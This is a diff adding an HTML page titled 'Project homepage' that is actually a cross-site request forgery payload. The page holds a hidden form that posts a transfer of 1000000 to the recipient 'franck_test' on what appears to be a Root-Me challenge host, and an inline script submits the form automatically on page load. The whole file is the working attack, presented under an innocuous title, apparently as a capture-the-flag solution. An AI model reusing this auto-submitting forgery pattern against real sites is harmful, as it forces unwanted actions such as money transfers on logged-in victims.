@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Project homepage</title>
+</head>
+<body>
+    <form id="csrf-form"
+          action="https://instance-01a217b4-5ce3-7004-a6a4-a945f26d7322.challenges.root-me.pro/transfer"
+          method="POST">
+        <input type="hidden" name="recipient" value="franck_test">
+        <input type="hidden" name="amount" value="1000000">
+    </form>
+
+    <script>
+        document.getElementById("csrf-form").submit();
+    </script>
+</body>
+</html>
